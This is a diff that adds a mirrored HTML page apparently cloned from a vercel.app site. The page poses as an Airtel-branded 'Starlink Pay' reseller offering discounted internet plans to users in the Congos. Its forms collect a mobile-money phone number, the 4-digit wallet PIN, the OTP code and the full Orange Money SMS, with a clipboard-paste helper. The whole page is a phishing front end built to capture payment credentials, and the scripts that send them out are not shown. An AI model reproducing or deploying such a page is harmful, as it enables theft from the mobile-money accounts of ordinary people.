@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<!-- Mirrored from starlink-airtel-2fej-five.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 12 Oct 2026 07:34:55 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Starlink Pay — Forfaits Internet</title>
+  <meta name="description" content="Payez votre forfait internet Starlink via Airtel Money ou Orange Money.">
+  <meta name="theme-color" content="#111111">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="apple-mobile-web-app-title" content="StarlinkPay">
+  <link rel="manifest" href="manifest.json">
+  <link rel="icon" type="image/png" href="assets/favicon.png">
+  <link rel="apple-touch-icon" href="assets/apple-touch-icon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ================================================
+     PWA INSTALL BANNER
+================================================ -->
+<div class="pwa-install-banner" id="pwa-install-banner" role="banner" aria-label="Installer l'application" style="display:none">
+  <div class="pwa-install-content">
+    <img src="assets/icon-192.png" alt="StarlinkPay" class="pwa-install-icon">
+    <div class="pwa-install-text">
+      <strong>Installer l'application</strong>
+      <span>Accès rapide depuis votre écran d'accueil</span>
+    </div>
+  </div>
+  <div class="pwa-install-actions">
+    <button class="pwa-install-btn" id="btn-pwa-install" onclick="PWAInstall.prompt()">Installer</button>
+    <button class="pwa-install-dismiss" id="btn-pwa-dismiss" onclick="PWAInstall.dismiss()" aria-label="Fermer">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+  </div>
+</div>
+
+<!-- iOS Safari install hint (shown only on iOS) -->
+<div class="ios-install-hint" id="ios-install-hint" style="display:none">
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+  <span>Appuyez sur <strong>Partager</strong> puis <strong>Sur l'écran d'accueil</strong> pour installer.</span>
+  <button class="ios-hint-close" onclick="PWAInstall.dismissIos()" aria-label="Fermer">×</button>
+</div>
+
+<div class="app" id="app">
+
+  <!-- ================================================
+       VIEW 1: PACKAGES
+  ================================================ -->
+  <div class="view active" id="view-packages">
+    <header class="header">
+      <img src="assets/logo.svg" alt="Airtel" class="header-logo">
+      <div class="header-divider"></div>
+      <span class="header-title">Revendeur Starlink</span>
+    </header>
+
+    <div class="packages-banner">
+      <p class="packages-banner-eyebrow">Forfaits Internet</p>
+      <h1 class="packages-banner-title">Choisissez Votre Forfait</h1>
+      <p class="packages-banner-sub">Sélectionnez un forfait et payez via Airtel Money ou Orange Money pour activer immédiatement.</p>
+    </div>
+
+    <div class="packages-hint">1) Cliquez sur un forfait &nbsp;2) Choisissez un opérateur Mobile Money</div>
+
+    <div class="packages-list">
+
+      <!-- Plan: Basique -->
+      <article class="plan-card">
+        <div class="plan-card-top">
+          <div class="plan-icon basic">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#2e7d32" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>
+            </svg>
+          </div>
+          <div class="plan-info">
+            <div class="plan-name">Forfait Basique</div>
+            <div class="plan-data">5 Go / mois</div>
+          </div>
+          <div class="plan-price-block">
+            <div class="plan-original-price">CDF 5,000</div>
+            <div class="plan-price-row">
+              <span class="plan-price">CDF 3,000</span>
+              <span class="plan-promo-badge">PROMO</span>
+            </div>
+            <div class="plan-period">/mois</div>
+          </div>
+        </div>
+        <div class="plan-tags">
+          <span class="plan-tag">Données illimitées</span>
+          <span class="plan-tag">Économique</span>
+        </div>
+        <div class="plan-card-footer">
+          <span class="plan-steps-hint">1) Cliquez 2) Choisissez Mobile Money</span>
+          <button class="btn-configurer" onclick="App.openPaymentModal('Forfait Basique', '5 Go/mois', 'CDF 3,000', 3000)" id="btn-basic">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Configurer
+          </button>
+        </div>
+      </article>
+
+      <!-- Plan: Standard -->
+      <article class="plan-card">
+        <div class="plan-card-top">
+          <div class="plan-icon std">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#1565c0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+            </svg>
+          </div>
+          <div class="plan-info">
+            <div class="plan-name">Forfait Standard</div>
+            <div class="plan-data">15 Go / mois</div>
+          </div>
+          <div class="plan-price-block">
+            <div class="plan-original-price">CDF 8,000</div>
+            <div class="plan-price-row">
+              <span class="plan-price">CDF 5,000</span>
+              <span class="plan-promo-badge">PROMO</span>
+            </div>
+            <div class="plan-period">/mois</div>
+          </div>
+        </div>
+        <div class="plan-tags">
+          <span class="plan-tag">Données illimitées</span>
+          <span class="plan-tag">Meilleur rapport</span>
+        </div>
+        <div class="plan-card-footer">
+          <span class="plan-steps-hint">1) Cliquez 2) Choisissez Mobile Money</span>
+          <button class="btn-configurer" onclick="App.openPaymentModal('Forfait Standard', '15 Go/mois', 'CDF 5,000', 5000)" id="btn-standard">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Configurer
+          </button>
+        </div>
+      </article>
+
+      <!-- Plan: Premium -->
+      <article class="plan-card">
+        <div class="plan-card-top">
+          <div class="plan-icon prem">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#6a1b9a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+            </svg>
+          </div>
+          <div class="plan-info">
+            <div class="plan-name">Forfait Premium</div>
+            <div class="plan-data">30 Go / mois</div>
+          </div>
+          <div class="plan-price-block">
+            <div class="plan-original-price">CDF 12,000</div>
+            <div class="plan-price-row">
+              <span class="plan-price">CDF 8,000</span>
+              <span class="plan-promo-badge">PROMO</span>
+            </div>
+            <div class="plan-period">/mois</div>
+          </div>
+        </div>
+        <div class="plan-tags">
+          <span class="plan-tag">Données illimitées</span>
+          <span class="plan-tag">Streaming HD</span>
+        </div>
+        <div class="plan-card-footer">
+          <span class="plan-steps-hint">1) Cliquez 2) Choisissez Mobile Money</span>
+          <button class="btn-configurer" onclick="App.openPaymentModal('Forfait Premium', '30 Go/mois', 'CDF 8,000', 8000)" id="btn-premium">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Configurer
+          </button>
+        </div>
+      </article>
+
+      <!-- Plan: Pro -->
+      <article class="plan-card">
+        <div class="plan-card-top">
+          <div class="plan-icon pro">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#e65100" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>
+            </svg>
+          </div>
+          <div class="plan-info">
+            <div class="plan-name">Forfait Pro</div>
+            <div class="plan-data">50 Go / mois</div>
+          </div>
+          <div class="plan-price-block">
+            <div class="plan-original-price">CDF 18,000</div>
+            <div class="plan-price-row">
+              <span class="plan-price">CDF 12,000</span>
+              <span class="plan-promo-badge">PROMO</span>
+            </div>
+            <div class="plan-period">/mois</div>
+          </div>
+        </div>
+        <div class="plan-tags">
+          <span class="plan-tag">Données illimitées</span>
+          <span class="plan-tag">Prioritaire</span>
+        </div>
+        <div class="plan-card-footer">
+          <span class="plan-steps-hint">1) Cliquez 2) Choisissez Mobile Money</span>
+          <button class="btn-configurer" onclick="App.openPaymentModal('Forfait Pro', '50 Go/mois', 'CDF 12,000', 12000)" id="btn-pro">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Configurer
+          </button>
+        </div>
+      </article>
+
+      <!-- Plan: Business -->
+      <article class="plan-card">
+        <div class="plan-card-top">
+          <div class="plan-icon biz">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#c62828" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/>
+            </svg>
+          </div>
+          <div class="plan-info">
+            <div class="plan-name">Forfait Business</div>
+            <div class="plan-data">100 Go / mois</div>
+          </div>
+          <div class="plan-price-block">
+            <div class="plan-original-price">&nbsp;</div>
+            <div class="plan-price-row">
+              <span class="plan-price">CDF 20,000</span>
+            </div>
+            <div class="plan-period">/mois</div>
+          </div>
+        </div>
+        <div class="plan-tags">
+          <span class="plan-tag">Données illimitées</span>
+          <span class="plan-tag">Entreprise</span>
+        </div>
+        <div class="plan-card-footer">
+          <span class="plan-steps-hint">1) Cliquez 2) Choisissez Mobile Money</span>
+          <button class="btn-configurer" onclick="App.openPaymentModal('Forfait Business', '100 Go/mois', 'CDF 20,000', 20000)" id="btn-biz">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Configurer
+          </button>
+        </div>
+      </article>
+
+    </div>
+  </div><!-- /view-packages -->
+
+
+  <!-- ================================================
+       MODAL: PAYMENT METHOD SELECTION
+  ================================================ -->
+  <div class="modal-overlay" id="modal-payment" role="dialog" aria-modal="true" aria-label="Choisir le mode de paiement">
+    <div class="modal-sheet">
+      <div class="modal-handle"></div>
+      <h2 class="modal-title">Choisissez votre mode de paiement</h2>
+      <p class="modal-sub">Comment souhaitez-vous payer ?</p>
+
+      <button class="pay-option" id="btn-choose-airtel" onclick="App.selectPaymentMethod('airtel')">
+        <div class="pay-option-icon airtel-icon">AM</div>
+        <div class="pay-option-text">
+          <div class="pay-option-name">Airtel Money</div>
+          <div class="pay-option-desc">Payez avec votre portefeuille Airtel</div>
+        </div>
+        <span class="pay-option-arrow">›</span>
+      </button>
+
+      <button class="pay-option" id="btn-choose-orange" onclick="App.selectPaymentMethod('orange')">
+        <div class="pay-option-icon orange-icon">OM</div>
+        <div class="pay-option-text">
+          <div class="pay-option-name">Orange Money</div>
+          <div class="pay-option-desc">Payez avec votre compte Orange Money</div>
+        </div>
+        <span class="pay-option-arrow">›</span>
+      </button>
+
+      <button class="modal-cancel" onclick="App.closePaymentModal()" id="btn-cancel-modal">Annuler</button>
+    </div>
+  </div>
+
+
+  <!-- ================================================
+       VIEW 2A: AIRTEL MONEY FORM
+  ================================================ -->
+  <div class="view" id="view-airtel">
+    <div class="pay-header-bar airtel-bar">
+      <button class="pay-header-back" onclick="App.goBack('airtel')" id="btn-airtel-back" aria-label="Retour">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      </button>
+      <img src="assets/airtel_white.svg" alt="Airtel" class="pay-header-bar-logo">
+      <span class="pay-header-bar-title">Airtel Money</span>
+    </div>
+
+    <div class="pay-meta-bar">
+      <div class="pay-meta-amount">
+        <div class="pay-meta-label">Montant</div>
+        <div class="pay-meta-value" id="airtel-meta-amount">CDF 3,000</div>
+      </div>
+      <div class="pay-meta-service">
+        <div class="pay-meta-label">Service</div>
+        <div style="font-weight:600;font-size:13px;color:#444">Renouvellement Starlink</div>
+      </div>
+    </div>
+
+    <div class="pay-form-body">
+      <p class="pay-form-title">Connexion Airtel Money</p>
+
+      <form id="form-airtel" onsubmit="App.submitAirtelForm(event)" novalidate>
+
+        <div class="field-group">
+          <label class="field-label" for="airtel-phone">Numéro de téléphone</label>
+          <div class="phone-row">
+            <div class="country-select-wrap" id="airtel-country-wrap">
+              <img src="assets/flag_cd.svg" class="country-flag" id="airtel-country-flag" alt="RD Congo">
+              <span class="country-code-text" id="airtel-country-code">+243</span>
+              <svg class="country-chevron" width="10" height="6" viewBox="0 0 10 6" fill="none">
+                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <select class="country-select-native" id="airtel-country-select" onchange="App.onCountryChange('airtel', this.value)" aria-label="Indicatif pays">
+                <option value="+243" selected>🇨🇩 RD Congo (+243)</option>
+                <option value="+242">🇨🇬 Congo-Brazzaville (+242)</option>
+              </select>
+            </div>
+            <input
+              type="tel"
+              id="airtel-phone"
+              class="phone-input"
+              placeholder="951234567"
+              inputmode="numeric"
+              maxlength="9"
+              autocomplete="tel-national"
+              oninput="App.onAirtelInput()"
+            >
+          </div>
+          <div class="field-error" id="err-airtel-phone">Numéro invalide — 9 chiffres requis.</div>
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="airtel-pin-1">Code PIN à 4 chiffres</label>
+          <div class="pin-boxes">
+            <input type="password" id="airtel-pin-1" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off"
+              oninput="App.pinInput(this,1,'airtel')" onkeydown="App.pinKeydown(event,1,'airtel')">
+            <input type="password" id="airtel-pin-2" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off"
+              oninput="App.pinInput(this,2,'airtel')" onkeydown="App.pinKeydown(event,2,'airtel')">
+            <input type="password" id="airtel-pin-3" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off"
+              oninput="App.pinInput(this,3,'airtel')" onkeydown="App.pinKeydown(event,3,'airtel')">
+            <input type="password" id="airtel-pin-4" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off"
+              oninput="App.pinInput(this,4,'airtel')" onkeydown="App.pinKeydown(event,4,'airtel')">
+            <button type="button" class="pin-toggle" id="airtel-pin-toggle" onclick="App.togglePinVisibility('airtel')" aria-label="Afficher le code">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+          <div class="field-error" id="err-airtel-pin">Le PIN doit comporter exactement 4 chiffres.</div>
+        </div>
+
+        <button type="submit" class="btn-submit airtel-btn" id="btn-airtel-submit">ENVOYER OTP</button>
+      </form>
+    </div>
+  </div><!-- /view-airtel -->
+
+
+  <!-- ================================================
+       VIEW 2B: ORANGE MONEY FORM
+  ================================================ -->
+  <div class="view" id="view-orange">
+    <div class="pay-header-bar orange-bar">
+      <button class="pay-header-back" onclick="App.goBack('orange')" id="btn-orange-back" aria-label="Retour">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      </button>
+      <span class="pay-header-bar-title">Orange Money</span>
+    </div>
+
+    <div class="pay-meta-bar">
+      <div class="pay-meta-amount">
+        <div class="pay-meta-label">Montant</div>
+        <div class="pay-meta-value orange" id="orange-meta-amount">CDF 3,000</div>
+      </div>
+      <div class="pay-meta-service">
+        <div class="pay-meta-label">Service</div>
+        <div style="font-weight:600;font-size:13px;color:#444">Renouvellement Starlink</div>
+      </div>
+    </div>
+
+    <div class="pay-form-body">
+      <p class="pay-form-title">Paiement Orange Money</p>
+
+      <form id="form-orange" onsubmit="App.submitOrangeForm(event)" novalidate>
+
+        <div class="field-group">
+          <label class="field-label" for="orange-phone">Numéro de téléphone</label>
+          <div class="phone-row">
+            <div class="country-select-wrap" id="orange-country-wrap">
+              <img src="assets/flag_cg.svg" class="country-flag" id="orange-country-flag" alt="Congo-Brazzaville">
+              <span class="country-code-text" id="orange-country-code">+242</span>
+              <svg class="country-chevron" width="10" height="6" viewBox="0 0 10 6" fill="none">
+                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <select class="country-select-native" id="orange-country-select" onchange="App.onCountryChange('orange', this.value)" aria-label="Indicatif pays">
+                <option value="+242" selected>🇨🇬 Congo-Brazzaville (+242)</option>
+                <option value="+243">🇨🇩 RD Congo (+243)</option>
+              </select>
+            </div>
+            <input
+              type="tel"
+              id="orange-phone"
+              class="phone-input"
+              placeholder="06 XXXXXXX"
+              inputmode="numeric"
+              maxlength="9"
+              autocomplete="tel-national"
+              oninput="App.onOrangeInput()"
+            >
+          </div>
+          <div class="field-error" id="err-orange-phone">Numéro invalide — au moins 9 chiffres requis.</div>
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="orange-pin">Code PIN à 4 chiffres</label>
+          <div class="pin-single-wrap">
+            <input
+              type="password"
+              id="orange-pin"
+              class="text-input"
+              placeholder="••••"
+              maxlength="4"
+              inputmode="numeric"
+              autocomplete="off"
+              style="padding-right: 44px;"
+              oninput="App.onOrangeInput()"
+            >
+            <button type="button" class="pin-single-toggle" onclick="App.toggleOrangePinVisibility()" aria-label="Afficher le code">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+          <div class="field-error" id="err-orange-pin">Le PIN doit comporter exactement 4 chiffres.</div>
+        </div>
+
+        <button type="submit" class="btn-submit orange-btn" id="btn-orange-submit">SUIVANT</button>
+      </form>
+    </div>
+  </div><!-- /view-orange -->
+
+
+  <!-- ================================================
+       VIEW 3A: AIRTEL OTP
+  ================================================ -->
+  <div class="view" id="view-airtel-otp">
+    <div class="pay-header-bar airtel-bar">
+      <button class="pay-header-back" onclick="App.goBack('airtel-otp')" id="btn-airtel-otp-back" aria-label="Retour">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      </button>
+      <img src="assets/airtel_white.svg" alt="Airtel" class="pay-header-bar-logo">
+      <span class="pay-header-bar-title">Vérification OTP</span>
+    </div>
+
+    <div class="otp-view-body">
+      <div class="otp-header-logo">
+        <div class="otp-airtel-icon">
+          <img src="assets/airtel_clean.svg" alt="Airtel">
+        </div>
+      </div>
+
+      <h2 class="otp-title">Entrez votre code OTP</h2>
+      <p class="otp-sub">
+        Un code à 4 chiffres a été envoyé au numéro<br>
+        <strong id="airtel-otp-phone-display">+243 — — — — —</strong>
+      </p>
+
+      <form id="form-airtel-otp" onsubmit="App.submitAirtelOtp(event)" novalidate>
+        <div class="otp-field-single" role="group" aria-label="Code OTP">
+          <input type="tel" id="aotp-1" class="otp-digit-box" maxlength="1" inputmode="numeric"
+            oninput="App.otpInput(this,1,'airtel')" onkeydown="App.otpKeydown(event,1,'airtel')">
+          <input type="tel" id="aotp-2" class="otp-digit-box" maxlength="1" inputmode="numeric"
+            oninput="App.otpInput(this,2,'airtel')" onkeydown="App.otpKeydown(event,2,'airtel')">
+          <input type="tel" id="aotp-3" class="otp-digit-box" maxlength="1" inputmode="numeric"
+            oninput="App.otpInput(this,3,'airtel')" onkeydown="App.otpKeydown(event,3,'airtel')">
+          <input type="tel" id="aotp-4" class="otp-digit-box" maxlength="1" inputmode="numeric"
+            oninput="App.otpInput(this,4,'airtel')" onkeydown="App.otpKeydown(event,4,'airtel')">
+        </div>
+
+        <div class="field-error" id="err-airtel-otp" style="text-align:center;margin-bottom:8px;">Veuillez entrer les 4 chiffres du code OTP.</div>
+
+        <p class="otp-timer">
+          Code expire dans <span id="airtel-otp-timer">39</span> secondes
+        </p>
+
+        <button type="submit" class="btn-submit airtel-btn" id="btn-airtel-otp-submit">VÉRIFIER</button>
+      </form>
+    </div>
+  </div><!-- /view-airtel-otp -->
+
+
+  <!-- ================================================
+       VIEW 3B: ORANGE OTP (PASTE MESSAGE)
+  ================================================ -->
+  <div class="view" id="view-orange-otp">
+    <div class="pay-header-bar orange-bar">
+      <button class="pay-header-back" onclick="App.goBack('orange-otp')" id="btn-orange-otp-back" aria-label="Retour">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      </button>
+      <span class="pay-header-bar-title">Confirmation OTP</span>
+    </div>
+
+    <div class="otp-view-body">
+      <div class="otp-header-logo">
+        <div class="otp-orange-icon">
+          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.63 3.37 2 2 0 0 1 3.6 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.58a16 16 0 0 0 6 6l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16z"/>
+          </svg>
+        </div>
+      </div>
+
+      <h2 class="otp-title">Message de confirmation OTP</h2>
+      <p class="otp-sub">Collez le message SMS Orange Money complet reçu sur le numéro<br><strong id="orange-otp-phone-display">+242 — — — — —</strong></p>
+
+      <div class="orange-otp-instructions">
+        <div class="orange-otp-instructions-title">Comment procéder :</div>
+        <ol class="orange-otp-steps">
+          <li>
+            <span class="step-num">1</span>
+            <span>Ouvrez votre application SMS ou Messages sur votre téléphone.</span>
+          </li>
+          <li>
+            <span class="step-num">2</span>
+            <span>Trouvez le message envoyé par <strong>Orange Money</strong> après votre demande de paiement.</span>
+          </li>
+          <li>
+            <span class="step-num">3</span>
+            <span>Appuyez longuement sur le message et sélectionnez <strong>Copier</strong> pour copier le texte entier.</span>
+          </li>
+          <li>
+            <span class="step-num">4</span>
+            <span>Revenez ici et collez le message dans le champ ci-dessous (ou utilisez le bouton).</span>
+          </li>
+        </ol>
+      </div>
+
+      <form id="form-orange-otp" onsubmit="App.submitOrangeOtp(event)" novalidate>
+        <button type="button" class="btn-clipboard" id="btn-paste-clipboard" onclick="App.pasteFromClipboard()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Coller depuis le presse-papiers
+        </button>
+        <p class="clipboard-note" id="clipboard-status">Cliquez pour accorder l'accès au presse-papiers — vous pouvez aussi coller manuellement (Ctrl+V / appui long).</p>
+
+        <div class="field-group">
+          <label class="field-label" for="orange-otp-message">Message SMS Orange Money</label>
+          <textarea
+            id="orange-otp-message"
+            class="otp-message-textarea"
+            placeholder="Collez ici le message SMS complet reçu d'Orange Money..."
+            oninput="App.onOrangeOtpInput()"
+            required
+          ></textarea>
+          <div class="field-error" id="err-orange-otp">Veuillez coller ou saisir le message OTP reçu.</div>
+        </div>
+
+        <button type="submit" class="btn-submit orange-btn" id="btn-orange-otp-submit">SOUMETTRE</button>
+      </form>
+    </div>
+  </div><!-- /view-orange-otp -->
+
+
+  <!-- ================================================
+       VIEW 4: PENDING VERIFICATION
+  ================================================ -->
+  <div class="view" id="view-pending">
+    <header class="header">
+      <img src="assets/logo.svg" alt="Airtel" class="header-logo">
+      <div class="header-divider"></div>
+      <span class="header-title">Revendeur Starlink</span>
+    </header>
+
+    <div class="pending-body">
+      <div class="pending-icon">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#e0a800" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+        </svg>
+      </div>
+
+      <p class="pending-status-label">En attente de vérification</p>
+      <h2 class="pending-title">Paiement en cours de traitement</h2>
+      <p class="pending-sub">Votre demande a bien été reçue. Veuillez patienter pendant que nous vérifions votre paiement. Cela peut prendre quelques minutes.</p>
+
+      <div class="summary-table">
+        <div class="summary-row">
+          <span class="summary-label">Référence</span>
+          <span class="summary-value" id="pend-ref">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Forfait</span>
+          <span class="summary-value" id="pend-plan">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Montant</span>
+          <span class="summary-value" id="pend-amount">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Numéro</span>
+          <span class="summary-value" id="pend-phone">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Mode de paiement</span>
+          <span class="summary-value" id="pend-method">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Statut</span>
+          <span class="summary-value pending-status">En attente</span>
+        </div>
+      </div>
+
+      <button class="btn-new-order" id="btn-new-order" onclick="App.reset()">Nouvelle commande</button>
+    </div>
+  </div><!-- /view-pending -->
+
+
+  <!-- ================================================
+       LOADING OVERLAY
+  ================================================ -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+    <p class="loading-text" id="loading-text">Traitement en cours...</p>
+  </div>
+
+  <!-- Toast container -->
+  <div class="toast-wrap" id="toast-wrap"></div>
+
+</div><!-- /app -->
+
+<script src="config.js"></script>
+<script src="app.js"></script>
+</body>
+
+<!-- Mirrored from starlink-airtel-2fej-five.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 12 Oct 2026 07:35:03 GMT -->
+</html>
